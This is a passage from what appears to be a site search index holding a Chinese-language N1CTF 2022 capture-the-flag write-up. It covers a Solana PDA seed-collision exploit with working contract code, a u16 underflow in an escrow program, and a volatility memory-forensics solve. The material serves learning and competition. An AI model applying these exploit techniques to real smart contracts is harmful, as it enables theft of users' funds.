{}\" , mint ) ? ; writeln! ( socket , \"user_token_account: {}\" , user_token_account_pubkey ) ? ; writeln! ( socket , \"reserve: {}\" , reserve ) ? ; let bump_budget = ComputeBudgetInstruction :: request_units ( 10_000_000 u32 , 0 u32 ); let solve_ix = chall . read_instruction ( solve_id ) ? ; chall . run_ixs_full ( & [ bump_budget , solve_ix ], & [ & user_keypair ], & user_keypair . pubkey (), ) . await ? ; let user_token_account = chall . read_token_account ( user_token_account_pubkey ). await ? ; writeln! ( socket , \"player_account_amount: {:?}\" , user_token_account . amount ) ? ; println! ( \" \\n player_account_amount balance = {} \\n \" , user_token_account . amount ); if user_token_account . amount > init_amount { writeln! ( socket , \"congrats!\" ) ? ; if let Ok ( flag ) = env :: var ( \"FLAG\" ) { writeln! ( socket , \"flag: {:?}\" , flag ) ? ; } else { writeln! ( socket , \"flag not found, please contact admin\" ) ? ; } } Ok (()) } \u8bfb\u53d6\u9898\u76ee\u5408\u7ea6\u548c\u7528\u6237\u8f93\u5165\u5408\u7ea6 \u589e\u52a0 mint\u3001payer\u3001user \u8d26\u6237 \u521d\u59cb\u7ed9 user 100_000_000_000 lamports \u83b7\u53d6\u5c5e\u4e8e\u9898\u76ee\u5408\u7ea6\u7684 catalog \u548c reserve PDA \u8c03\u7528\u9898\u76ee\u5408\u7ea6\u7684 Initialize \u6307\u4ee4 \u8c03\u7528 Register\uff0corg_name \u548c employee_id \u4e3a (\"product\", \"employ_A\") \u521b\u5efa payer_token_account\uff0c\u521d\u59cb\u7ed9\u5176 1000 token \u83b7\u53d6 seed (\"product\", \"employ_A\") \u7684 PDA \u4f5c\u4e3a vault\uff0c\u8c03\u7528 Deposit\uff0camount \u4e3a 500 token \u521b\u5efa user_record \u548c user_token_account\uff0c\u5411\u5176\u4e2d\u521d\u59cb\u8f6c 100 token \u8f93\u51fa\u4e00\u7cfb\u5217 pubkey \u8bfb\u53d6\u6307\u4ee4\uff0c\u8c03\u7528\u7528\u6237\u5408\u7ea6 \u83b7\u53d6 user_token_account \u7684 token \u4e2a\u6570\uff0c\u5982\u679c\u591a\u4e8e 100 \u4e2a\u5219\u8f93\u51fa flag \u505a\u6cd5 \u00b6 \u8fd9\u9898\u7684\u7b54\u9898\u4ea4\u4e92\u4e5f\u7ed9\u4e86\uff0c\u662f rust \u4ee3\u7801\uff0c\u5199\u597d\u4e86\u76f4\u63a5\u6539\u4e0b tcp \u5730\u5740\u7136\u540e cargo run \u5c31\u53ef\u4ee5\u6253\u4e86\u3002 \u4e3b\u8981\u7684\u89e3\u6cd5\u8fd8\u662f\u5728 solve/programs/solve/src/lib.rs \u4e2d\u7f16\u5199\u3002 \u9898\u7ed9\u4e86\u4e00\u4e2a\u521d\u59cb\u5316\u6307\u4ee4\u548c\u5176\u7ed3\u6784\u4f53\u7684\u5b9a\u4e49\uff0c\u5728\u91cc\u9762\u8865\u5145\u5c31\u53ef\u4ee5\u3002\u539f\u6709\u7684\u662f\u4e00\u4e2a\u8c03\u7528 Register \u7684\u4ee3\u7801\uff0cregister \u4e86 (\"product\", \"employ_B\") \u8fd9\u4e2a record\u3002 \u627e\u4e86\u5f88\u957f\u65f6\u95f4\u6ca1\u770b\u51fa\u6f0f\u6d1e\u5728\u54ea\u3002\u4f46 solana \u7684\u5b98\u65b9\u6587\u6863\u4e2d \u5173\u4e8e PDA seed \u7684\u63cf\u8ff0 \u91cc\u9762\u6709\u4e00\u4e2a warning\uff1a Warning: Because of the way the seeds are hashed there is a potential for program address collisions for the same program id. The seeds are hashed sequentially which means that seeds {\"abcdef\"}, {\"abc\", \"def\"}, and {\"ab\", \"cd\", \"ef\"} will all result in the same program address given the same program id. Since the chance of collision is local to a given program id, the developer of that program must take care to choose seeds that do not collide with each other. For seed schemes that are susceptible to this type of hash collision, a common remedy is to insert separators between seeds, e.g. transforming {\"abc\", \"def\"} into {\"abc\", \"-\", \"def\"}. \u5927\u4f53\u610f\u601d\u5c31\u662f\uff0c\u5982\u679c seed \u6709\u591a\u4e2a\u7684\u8bdd\uff0c\u8ba1\u7b97\u7684\u65f6\u5019\u662f\u76f4\u63a5\u62fc\u63a5\u8d77\u6765\u7684\uff0c[\"abcdef\"] \u548c [\"abc\", \"def\"]\u3001[\"ab\", \"cdef\"] \u7b97\u51fa\u6765\u7684 PDA \u662f\u4e00\u6837\u7684\u3002 \u800c\u9898\u76ee\u4e2d\u83b7\u53d6 vault \u7528\u7684 seed \u662f [org_name, employee_id]\uff0c\u8fd9\u91cc\u5c31\u5b58\u5728\u4e86\u62fc\u63a5\u3002\u65e2\u7136\u6211\u4eec\u4e0d\u80fd\u4f7f\u7528\u540c\u6837\u7684 (org_name, employee_id) \u6765\u6ce8\u518c\u3001\u83b7\u53d6\u5230\u5176\u8bb0\u5f55\u6709 500 token \u7684 vault\uff0c\u4f46\u6211\u4eec\u53ef\u4ee5\u7528\u53e6\u4e00\u5bf9 (org_name, employee_id) \u6765\u5b8c\u6210\u6ce8\u518c\u3001\u5e76\u5728 withdraw \u83b7\u53d6 vault \u7684\u65f6\u5019\u4f7f\u5176\u62fc\u63a5\u8d77\u6765\u548c\u9898\u76ee\u4e2d\u7684\u4e00\u6837\u6765\u83b7\u53d6\u5230\u90a3\u4e2a 500 token \u7684 vault\u3002 \u6240\u4ee5\u6211\u4eec\u6ce8\u518c\u4e00\u4e2a (\"produc\", \"temploy_A\") \u7136\u540e\u76f4\u63a5 withdraw \u5c31\u53ef\u4ee5\u4e86\uff1a exp \u5408\u7ea6 initialize \u6307\u4ee4 pub fn initialize ( ctx : Context < Initialize > ) -> Result < () > { let o1 = String :: from ( \"produc\" ); let e1 = String :: from ( \"temploy_A\" ); let cpi_accounts = chall :: cpi :: accounts :: Register { catalog : ctx . accounts . catalog . to_account_info (), employee_record : ctx . accounts . user_record . to_account_info (), user : ctx . accounts . user . to_account_info (), system_program : ctx . accounts . system_program . to_account_info (), rent : ctx . accounts . rent . to_account_info (), }; let cpi_ctx = CpiContext :: new ( ctx . accounts . chall . to_account_info (), cpi_accounts ); chall :: cpi :: register ( cpi_ctx , o1 , e1 ) ? ; let o1 = String :: from ( \"produc\" ); let e1 = String :: from ( \"temploy_A\" ); let cpi_accounts = chall :: cpi :: accounts :: Withdraw { vault : ctx . accounts . vault . to_account_info (), employee_record : ctx . accounts . user_record . to_account_info (), reserve : ctx . accounts . reserve . to_account_info (), user_account : ctx . accounts . user_token_account . to_account_info (), mint : ctx . accounts . mint . to_account_info (), payer : ctx . accounts . user . to_account_info (), token_program : ctx . accounts . token_program . to_account_info (), system_program : ctx . accounts . system_program . to_account_info (), rent : ctx . accounts . rent . to_account_info (), }; let cpi_ctx = CpiContext :: new ( ctx . accounts . chall . to_account_info (), cpi_accounts ); chall :: cpi :: withdraw ( cpi_ctx , o1 , e1 , 1 ) ? ; Ok (()) } \u7136\u540e\u4ea4\u4e92\u7684 main.rs \u4e2d\u8fd8\u6709\u4e00\u5904\u83b7\u53d6\u53c2\u6570 vault \u7684\u5730\u65b9\u4e5f\u9700\u8981\u6539\u4e00\u4e0b\uff1a let vault = Pubkey :: find_program_address ( & [ b\"produc\" , b\"temploy_A\" ], & chall_id , ). 0 ; \u5176\u5b83\u6cbf\u7528\u7ed9\u7684\u4ea4\u4e92\u5c31\u53ef\u4ee5\u4e86\u3002\u8fd9\u6837 main.rs \u4e2d\u8f93\u5165\u6307\u4ee4\uff0c\u8c03\u7528 exp \u5408\u7ea6\u7684 Initialize \u6307\u4ee4\uff0c\u5176\u4e2d withdraw \u4e86\uff0c\u7ed3\u675f\u540e\u68c0\u67e5 token amount \u5c31\u4f1a\u6bd4\u539f\u5148\u66f4\u591a\u4e86\u3002 flag: n1ctf{I_sh0uld_h4ve_ch0s3n_4_b3tt3r_se3d_de5ign} just find flag \u00b6 \u4e00\u9053 Windows \u5185\u5b58\u53d6\u8bc1\u9898\uff0c\u5dee\u4e86\u4e00\u6b65\u6ca1\u505a\u51fa\u6765\u3002\u7ed3\u675f\u540e\u8865\u5b8c\u4e86\u3002 \u5185\u5b58\u53d6\u8bc1\u76f4\u63a5\u4e0a\u624b\u5148 strings \u4e00\u628a\u68ad\uff0c\u53d1\u73b0\u4e86 flag.zip\u3001flag.txt\u3002\u662f\u4e00\u4e2a\u538b\u7f29\u5305\uff0c\u76f4\u63a5\u4ece\u5341\u516d\u8fdb\u5236\u91cc\u628a\u5b83\u5b8c\u6574\u5185\u5bb9\u6252\u51fa\u6765\uff0c\u53d1\u73b0\u6709\u5bc6\u7801\uff0c\u800c\u4e14\u662f\u771f\u5bc6\u7801\uff0c\u516d\u4f4d\u6570\u5bc6\u7801\u7206\u4e0d\u51fa\u6765\u3002 \u7ee7\u7eed volatility \u4e00\u628a\u68ad\uff0cimageinfo \u51fa\u6765\u662f Win7 \u7cfb\u7edf\uff0c\u4e00\u4e9b\u6ca1\u7528\u7684\u6307\u4ee4\u8f93\u51fa\u5c31\u4e0d\u5728\u8fd9\u91cc\u5199\u4e86 \u5728\u6267\u884c consoles \u6307\u4ee4\u7684\u65f6\u5019\u53d1\u73b0\u4e86\uff1a ************************************************** ConsoleProcess: conhost.exe Pid: 2480 Console: 0xff656200 CommandHistorySize: 50 HistoryBufferCount: 2 HistoryBufferMax: 4 OriginalTitle: %SystemRoot%\\system32\\cmd.exe Title: C:\\Windows\\system32\\cmd.exe - C:\\Python27\\python.exe -m SimpleHTTPServer AttachedProcess: python.exe Pid: 2052 Handle: 0x8c AttachedProcess: cmd.exe Pid: 2336 Handle: 0x60 ---- CommandHistory: 0x37ed10 Application: python.exe Flags: Allocated CommandCount: 0 LastAdded: -1 LastDisplayed: -1 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x8c ---- CommandHistory: 0x37e9c0 Application: cmd.exe Flags: Allocated, Reset CommandCount: 3 LastAdded: 2 LastDisplayed: 2 FirstCommand: 0 CommandCountMax: 50 ProcessHandle: 0x60 Cmd #0 at 0x382d60: echo \"Stucked? You can ask WallPaper god for help.\" Cmd #1 at 0x35e3a0: cd Desktop Cmd #2 at 0x382dd0: C:\\Python27\\python.exe -m SimpleHTTPServer ---- Screen 0x360f70 X:80 Y:300 Dump: Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation. All rights reserved. C:\\Users\\dora>echo \"Stucked? You can ask WallPaper god for help.\" \"Stucked? You can ask WallPaper god for help.\" C:\\Users\\dora>cd Desktop C:\\Users\\dora\\Desktop>C:\\Python27\\python.exe -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... 192.168.17.129 - - [05/Nov/2022 03:08:43] \"GET /mem.zip HTTP/1.1\" 200 - \u6709\u4e00\u53e5 \"Stucked? You can ask WallPaper god for help.\"\u3002\u6240\u4ee5\u5728 strings \u91cc\u9762\u518d\u641c Wallpaper\uff0c\u53d1\u73b0\u6709\u76f8\u5173\u6587\u4ef6\uff0c\u7ee7\u7eed volatility \u68ad\uff1a volatility -f mem.raw --profile = Win7SP1x64 filescan > files.txt \u6709\u5f88\u591a\u5f88\u591a\u6587\u4ef6\uff0c\u5728\u91cc\u9762\u641c\u4e00\u4e0b\u53d1\u73b0\u4e86\u4e24\u4e2a Wallpaper \u8def\u5f84\u4e0b\u7684\u6587\u4ef6\uff1a Offset(P) #Ptr #Hnd Access Name ------------------ ------ ------ ------ ---- ... 0x000000007eee11c0 10 0 R--r-- \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpg ... 0x000000007fc48f20 16 0 R--r-d \\Device\\HarddiskVolume1\\Windows\\Web\\Wallpaper\\Windows\\img0.jpeg ... \u7136\u540e\u5206\u522b\u7528 volatility -f mem.raw --profile=Win7SP1x64 dumpfiles -Q <Offset> --dump-dir=./ \u63d0\u53d6\uff0c\u53d1\u73b0\u4e0a\u9762\u4e00\u5f20\u662f Win7 \u7ecf\u5178\u58c1\u7eb8\uff0c\u4e0b\u9762\u4e00\u5f20\u662f\uff1a \u7136\u540e\u8fd9\u91cc\u5361\u4f4f\u4e86\uff0c\u627e\u4e86\u5f88\u957f\u65f6\u95f4\u4e5f\u627e\u4e0d\u51fa\u4ed6\u8bf4\u7684\u6ca1\u6709 Desktop \u7684 full path \u662f\u4ec0\u4e48\u3002 \u8d5b\u540e\u542c\u8bf4\u662f\u8981\u7528 volatility \u7684 mtfparser \u6307\u4ee4\uff0c\u8bd5\u4e86\u4e00\u4e0b\uff0c\u786e\u5b9e\u662f\u6709\u7684\uff1a volatility -f mem.raw --profile = Win7SP1x64 mftparser > mftparser.txt \u6709\u4e2a\u8def\u5f84 PROGRA~2\\WINDOW~2\\ACCESS~1\\flag.zip \uff0c\u53ef\u4ee5\u63a8\u6d4b\u51fa\u8fd9\u4e2a\u7f29\u5199\u5b9e\u9645\u4e0a\u662f C:\\Program Files (x86)\\Windows NT\\Accessories\\flag.zip \u3002\u6240\u4ee5\u538b\u7f29\u5305\u7684\u5bc6\u7801\u5c31\u662f\uff08 \\f \u5c31\u662f\u8981\u8fd9\u6837\u653e\u7740\u4e0d\u7ba1\uff0c\u9898\u76ee\u7ed9\u4e86 note \u4e86\uff09\uff1a hashlib . md5 ( b \"C:\\Program Files (x86)\\Windows NT\\Accessories \\f lag.zip\" ) . hexdigest () # 0d3ba7db468bdbd4f93a88c97ba7bef1 \u89e3\u538b\u51fa\u6765\u5c31\u662f flag \u4e86\u3002 \u53cd\u6b63\u8fd8\u662f volatility \u4e0d\u719f\u7ec3\uff0c\u8bb0\u4e0b\u4e86\u3002Windows \u4e0b\u4e00\u4e9b\u5220\u6389\u4e86\u7684\u6587\u4ef6\u53ef\u4ee5\u5c1d\u8bd5\u7528 mtfparser \u6765\u641c\u4e00\u4e0b\u3002","title":"N1CTF 2022"},{"location":"writeups/n1ctf2022/#n1ctf-2022-writeup","text":"Abstract \u8fd9\u6b21\u4e3b\u8981\u505a\u4e86\u4e0b blockchain\uff0cmisc \u6709\u4e2a\u5185\u5b58\u53d6\u8bc1\u5dee\u4e00\u70b9\u505a\u51fa\u6765\uff0c\u4e5f\u5728\u8fd9\u91cc\u8bb0\u4e00\u4e0b \u542c\u8bf4\u8fd9\u6b21\u7684 blockchain \u4f1a\u8bbe\u5355\u9879\u5956\uff0c\u5e94\u8be5\u5f88\u6709\u8d28\u91cf\u3002\u6ca1\u60f3\u5230\u662f\u6ca1\u63a5\u89e6\u8fc7\u7684 solana \u533a\u5757\u94fe\uff0c\u7b2c\u4e00\u6b21\u73a9\uff0c\u8fd8\u633a\u6709\u610f\u601d\u7684\uff0c\u800c\u4e14\u9898\u7ed9\u7684\u505a\u9898\u6846\u67b6\u4e5f\u5f88\u5168\uff0c\u8fd8\u7b97\u5f88\u8212\u9002 \u611f\u89c9 solana \u8fd8\u662f\u6709\u5f88\u591a\u9700\u8981\u4e86\u89e3\u7684\u57fa\u7840\u77e5\u8bc6\u8fd8\u662f\u5f88\u591a\u7684\uff0c\u6709\u65f6\u95f4\u4ee5\u540e\u7cfb\u7edf\u5b66\u4e60\u7684\u65f6\u5019\u518d\u8bb0\u5f55\u5427","title":"N1CTF 2022 Writeup"},{"location":"writeups/n1ctf2022/#utility-payment-service","text":"solana \u7684\u5408\u7ea6\u770b\u8d77\u6765\u5f88\u957f\u5f88\u590d\u6742\uff0c\u9644\u4ef6\u4e5f\u662f\u5b8c\u6574\u7684 cargo \u5de5\u4f5c\u533a\uff0c\u6240\u4ee5\u8fd9\u91cc\u4e0d\u5168\u5217\u51fa\u6765\u4e86\u3002 processor \u90e8\u5206 use borsh :: { BorshDeserialize , BorshSerialize }; use solana_program :: { account_info :: { next_account_info , AccountInfo }, entrypoint :: ProgramResult , msg , program :: { invoke , invoke_signed }, pubkey :: Pubkey , system_instruction , }; use crate :: { Escrow , ServiceInstruction , ESCROW_ACCOUNT_SIZE }; pub fn process_instruction ( program : & Pubkey , accounts : & [ AccountInfo ], mut data : & [ u8 ], ) -> ProgramResult { match ServiceInstruction :: deserialize ( & mut data ) ? { ServiceInstruction :: Init {} => init_escrow ( program , accounts ), ServiceInstruction :: DepositEscrow { amount } => deposit_escrow ( program , accounts , amount ), ServiceInstruction :: WithdrawEscrow {} => withdraw_escrow ( program , accounts ), ServiceInstruction :: Pay { amount } => pay_utility_fees ( program , accounts , amount ), } } pub fn get_escrow ( program : Pubkey , user : Pubkey ) -> ( Pubkey , u8 ) { Pubkey :: find_program_address ( & [ \"ESCROW\" . as_bytes (), & user . to_bytes ()], & program ) } pub fn get_reserve ( program : Pubkey ) -> ( Pubkey , u8 ) { Pubkey :: find_program_address ( & [ \"RESERVE\" . as_bytes ()], & program ) } /// /// init escrow /// fn init_escrow ( program : & Pubkey , accounts : & [ AccountInfo ]) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let _reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); assert! ( escrow_account . data_is_empty ()); let ( expected_escrow , escrow_bump ) = get_escrow ( * program , * user . key ); invoke_signed ( & system_instruction :: create_account ( & user . key , & expected_escrow , 1 , ESCROW_ACCOUNT_SIZE as u64 , & program , ), & [ user . clone (), escrow_account . clone (), sys_prog . clone ()], & [ & [ \"ESCROW\" . as_bytes (), & user . key . to_bytes (), & [ escrow_bump ]]], ) ? ; let escrow_data = Escrow { user : * user . key , amount : 0 , bump : escrow_bump , }; escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]). unwrap (); Ok (()) } /// /// deposit escrow /// fn deposit_escrow ( program : & Pubkey , accounts : & [ AccountInfo ], deposit_amount : u16 , ) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); let ( expected_reserve , _reserve_bump ) = get_reserve ( * program ); assert_eq! ( expected_reserve , * reserve . key ); let ( expected_escrow , _escrow_bump ) = get_escrow ( * program , * user . key ); assert_eq! ( expected_escrow , * escrow_account . key ); invoke ( & system_instruction :: transfer ( & user . key , & reserve . key , deposit_amount as u64 ), & [ user . clone (), reserve . clone (), sys_prog . clone () ], ) ? ; let escrow_data = & mut Escrow :: deserialize ( & mut & ( * escrow_account . data ). borrow_mut ()[ .. ]) ? ; escrow_data . amount += deposit_amount ; escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } /// /// withdraw all balance in escrow /// fn withdraw_escrow ( program : & Pubkey , accounts : & [ AccountInfo ]) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); let ( expected_reserve , reserve_bump ) = get_reserve ( * program ); assert_eq! ( expected_reserve , * reserve . key ); let ( expected_escrow , _escrow_bump ) = get_escrow ( * program , * user . key ); assert_eq! ( expected_escrow , * escrow_account . key ); let escrow_data = & mut Escrow :: deserialize ( & mut & ( * escrow_account . data ). borrow_mut ()[ .. ]) ? ; let balance = escrow_data . amount ; invoke_signed ( & system_instruction :: transfer ( & reserve . key , & user . key , balance as u64 ), & [ user . clone (), reserve . clone (), sys_prog . clone ()], & [ & [ \"RESERVE\" . as_bytes (), & [ reserve_bump ]]], ) ? ; escrow_data . amount = 0 ; escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } /// /// pay utility /// fn pay_utility_fees ( program : & Pubkey , accounts : & [ AccountInfo ], amount : u16 ) -> ProgramResult { let account_iter = & mut accounts . iter (); let user = next_account_info ( account_iter ) ? ; let reserve = next_account_info ( account_iter ) ? ; let escrow_account = next_account_info ( account_iter ) ? ; let _sys_prog = next_account_info ( account_iter ) ? ; assert! ( user . is_signer ); let ( expected_reserve , _reserve_bump ) = get_reserve ( * program ); assert_eq! ( expected_reserve , * reserve . key ); let ( expected_escrow , _escrow_bump ) = get_escrow ( * program , * user . key ); assert_eq! ( expected_escrow , * escrow_account . key ); let escrow_data = & mut Escrow :: deserialize ( & mut & ( * escrow_account . data ). borrow_mut ()[ .. ]) ? ; let base_fee = 15_ u16 ; if escrow_data . amount >= 10 { if amount < base_fee { escrow_data . amount -= base_fee ; } else { assert! ( escrow_data . amount >= amount ); escrow_data . amount -= amount ; } } else { msg ! ( \"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\" ); } escrow_data . serialize ( & mut & mut ( * escrow_account . data ). borrow_mut ()[ .. ]) . unwrap (); Ok (()) } \u53ef\u4ee5\u770b\u51fa\u4e3b\u8981\u6709\u4e09\u4e2a\u65b9\u6cd5\uff1a Init\uff1a\u521d\u59cb\u5316\u5e76\u7b7e\u540d escrow DepositEscrow\uff1a\u5b58\u5165 deposit_amount \u91d1\u989d \u5c06\u94b1\u8f6c\u5165 reserve account\uff08\u53ea\u7531 program seed \u751f\u6210\uff09 \u5c06\u7528\u6237\u5bf9\u5e94 escrow account\uff08\u7531 program \u548c user.key \u7684 seed \u5408\u6210\u751f\u6210\uff09\u7684 amount \u589e\u52a0 deposit_amout WithdrawEscrow\uff1a\u5c06 escrow \u8bb0\u5f55\u7684\u6240\u6709\u91d1\u989d\u90fd\u8f6c\u56de\u7ed9\u7528\u6237 \u4ece reserve account \u8f6c\u51fa Pay\uff1a\u652f\u4ed8\uff0c\u4e5f\u5c31\u662f\u51cf\u5c11\u7528\u6237 escrow \u7684 amount\u3002\u8fd8\u662f\u770b\u4ee3\u7801\u66f4\u6e05\u6670\uff1a let base_fee = 15_ u16 ; if escrow_data . amount >= 10 { if amount < base_fee { escrow_data . amount -= base_fee ; } else { assert! ( escrow_data . amount >= amount ); escrow_data . amount -= amount ; } } else { msg ! ( \"ABORT: Cannot make payments when the escrow account has a balance less than 10 lamports.\" ); } \u8fd9\u91cc\u5b58\u5728\u4e00\u4e2a\u8f83\u660e\u663e\u7684\u9690\u60a3\u662f u16\uff0c\u4e5f\u5c31\u662f 16 \u4f4d\u65e0\u7b26\u53f7\u6574\u578b\u3002\u518d\u56de\u5934\u770b lib.rs \u4e2d\u89c4\u5b9a\u7684 Escrow account \u7ed3\u6784\u4f53\uff1a #[repr(C)] #[derive(BorshSerialize, BorshDeserialize)] pub struct Escrow { pub user : Pubkey , pub amount : u16 , pub bump : u8 , } \u8fd9\u91cc\u7684 amount \u4e5f\u662f u16\uff0c\u5b58\u5728\u6574\u578b\u6ea2\u51fa\u98ce\u9669\u3002 \u63a5\u7740\u770b main.rs \u4e2d\u7684\u9898\u76ee\u90e8\u5206\uff1a \u9898\u76ee\u4ea4\u4e92\u90e8\u5206 fn handle_connection ( mut socket : TcpStream ) -> Result < (), Box < dyn Error >> { let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); // load programs let solve_pubkey = builder . input_program (). unwrap (); let program_pubkey = builder . chall_programs ( & [ \"./utility_payment.so\" ])[ 0 ]; // make user let user = Keypair :: new (); writeln! ( socket , \"program pubkey: {}\" , program_pubkey ) ? ; writeln! ( socket , \"solve pubkey: {}\" , solve_pubkey ) ? ; writeln! ( socket , \"user pubkey: {}\" , user . pubkey ()) ? ; // println!(\"program: {}\", program_pubkey); // add accounts and lamports let ( reserve , _ ) = get_reserve ( program_pubkey ); // let (escrow, _) = get_escrow(program_pubkey, user.pubkey()); const TARGET_AMT : u64 = 60_000 ; const INIT_BAL : u64 = 50 ; const RESERVE_BAL : u64 = 1_000_000 ; builder . builder . add_account_with_lamports ( user . pubkey (), system_program :: ID , INIT_BAL ); builder . builder . add_account_with_lamports ( reserve , system_program :: ID , RESERVE_BAL ); let mut challenge = builder . build (); let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport before: {:?}\" , balance ) ? ; // run solve challenge . input_instruction ( solve_pubkey , & [ & user ]). unwrap (); // check solve let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport after: {:?}\" , balance ) ? ; if balance > TARGET_AMT { let flag = fs :: read_to_string ( \"flag.txt\" ). unwrap (); writeln! ( socket , \"Flag: {}\" , flag ) ? ; } Ok (()) } \u7b2c\u4e00\u6b21\u63a5\u89e6 solana \u9898\u76ee\uff0c\u6240\u4ee5\u9010\u6b65\u89e3\u6790\u4e00\u4e0b\uff1a \u521b\u5efa\u4e00\u4e2a builder \u5e76\u83b7\u53d6\u7528\u6237\u5408\u7ea6\u4ee5\u53ca\u9898\u76ee\u5408\u7ea6\uff08ChallengeBuilder \u6765\u81ea sol-ctf-framework\uff09\uff1a let mut builder = ChallengeBuilder :: try_from ( socket . try_clone (). unwrap ()). unwrap (); // load programs let solve_pubkey = builder . input_program (). unwrap (); let program_pubkey = builder . chall_programs ( & [ \"./utility_payment.so\" ])[ 0 ]; \u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u662f\u4e00\u4e2a solana \u5408\u7ea6\u5728\u4e0a\u94fe\u7684\u65f6\u5019\u9700\u8981\u7f16\u8bd1\u6210 BPF\uff08Berkley Packer Filter\uff09\u5b57\u8282\u7801\uff0c\u4e5f\u5c31\u662f\u4e00\u4e2a .so \u6587\u4ef6 ChallengeBuilder::input_program \u65b9\u6cd5\u53ef\u4ee5\u901a\u8fc7\u6e90\u7801\u770b\u51fa\u9996\u5148\u8f93\u5165\u7a0b\u5e8f\u957f\u5ea6\uff0c\u7136\u540e\u8bfb\u53d6 .so \u7684\u5b57\u8282\u5e8f\u5217 \u521b\u5efa\u7528\u6237\u8d26\u6237\u5e76\u8f93\u51fa\u4e00\u7cfb\u5217 pubkey\uff1a let user = Keypair :: new (); writeln! ( socket , \"program pubkey: {}\" , program_pubkey ) ? ; writeln! ( socket , \"solve pubkey: {}\" , solve_pubkey ) ? ; writeln! ( socket , \"user pubkey: {}\" , user . pubkey ()) ? ; \u6839\u636e program_pubkey \u6765\u627e\u5230 reserve \u8d26\u6237\uff1a let ( reserve , _ ) = get_reserve ( program_pubkey ); \u5176\u4e2d get_reserve \u51fd\u6570\u5728 processor.rs \u4e2d\u5b9a\u4e49\uff1a pub fn get_reserve ( program : Pubkey ) -> ( Pubkey , u8 ) { Pubkey :: find_program_address ( & [ \"RESERVE\" . as_bytes ()], & program ) } \u8fd9\u91cc\u9700\u8981\u4e86\u89e3\u7684\u4e00\u4e2a\u662f solana \u7684\u8d26\u6237\u5206\u4e3a\u4e00\u822c\u8d26\u6237\u548c PDA\uff08Program Derived Address\uff09 PDA \u4e00\u822c\u662f\u7531\u7a0b\u5e8f\u751f\u6210\u7528\u6765\u8bb0\u5f55\u6570\u636e\u7684 PDA \u7684\u8ba1\u7b97\u662f\u6839\u636e seed \u548c program_id\uff08\u4e5f\u5c31\u662f\u7a0b\u5e8f\u7684 pubkey\uff09\u505a\u54c8\u5e0c\u6765\u751f\u6210\u7684 \u4f46\u662f PDA \u8981\u4fdd\u8bc1\u4e0d\u662f\u53ef\u7528\u7684 Pubkey\uff08\u8fd9\u4e2a\u8fd8\u6ca1\u7406\u89e3\uff09\uff0c\u6240\u4ee5 hash \u7684\u65f6\u5019\u8981\u518d\u52a0\u4e00\u4e2a\u53c2\u6570 bump\uff1apda = hash(seed, bump, program_id) \u5bfb\u627e\u4e00\u4e2a PDA \u7684\u65f6\u5019\u4f1a\u4ece 0 \u5230 256 \u679a\u4e3e bump\uff0c\u7b2c\u4e00\u4e2a\u53ef\u4ee5\u751f\u6210\u6709\u6548 PDA \u7684 bump \u79f0\u4e3a canonical bump\uff0c\u800c\u4e14\u4e00\u822c\u5c31\u4f7f\u7528\u8fd9\u4e2a PDA \u6240\u4ee5\u6839\u636e\u76f8\u540c seed\u3001\u76f8\u540c program_id \u751f\u6210\u7684 PDA \u4e5f\u662f\u76f8\u540c\u7684\u3002Pubkey::find_program_address \u505a\u7684\u5c31\u662f\u8fd9\u4e2a\uff0c\u5b83\u7684\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f seed\u3001\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f program_id \u6240\u4ee5 reserve \u662f\u4e00\u4e2a\u7531 RESERVE seed \u548c program_pubkey \u751f\u6210\u7684 PDA \u4e3a account \u589e\u52a0\u521d\u59cb lamports\uff08\u94b1\uff09\uff1a const TARGET_AMT : u64 = 60_000 ; const INIT_BAL : u64 = 50 ; const RESERVE_BAL : u64 = 1_000_000 ; builder . builder . add_account_with_lamports ( user . pubkey (), system_program :: ID , INIT_BAL ); builder . builder . add_account_with_lamports ( reserve , system_program :: ID , RESERVE_BAL ); \u7ed9 user 50 lamports \u7ed9 reserve 1000000 lamports \u6784\u5efa challenge\u3001\u8f93\u51fa user \u521d\u59cb lamports\uff1a let mut challenge = builder . build (); let balance = challenge . env . get_account ( user . pubkey ()). unwrap (). lamports ; writeln! ( socket , \"user lamport before: {:?}\" , balance ) ? ; \u63a5\u6536\u6307\u4ee4\uff0c\u4ea4\u7ed9\u7528\u6237\u5408\u7ea6\u6267\u884c\uff1a challenge . input_instruction ( solve_pubkey , & [ & user ]). unwrap (); \u8fd9\u91cc\u7684 input_instruction \u65b9\u6cd5\u4e5f\u662f\u5728 sol-ctf-framework \u4e2d\u5b9a\u4e49\u7684\uff0c\u8f93\u5165\u65b9\u6cd5\u8f83\u590d\u6742\uff0c\u4e0d\u8fc7\u597d\u5728\u9898\u76ee\u63d0\u4f9b\u4e86\u4e00\u4e2a solve.py \u7528\u6765\u4ea4\u4e92\u8f93\u5165\u6307\u4ee4 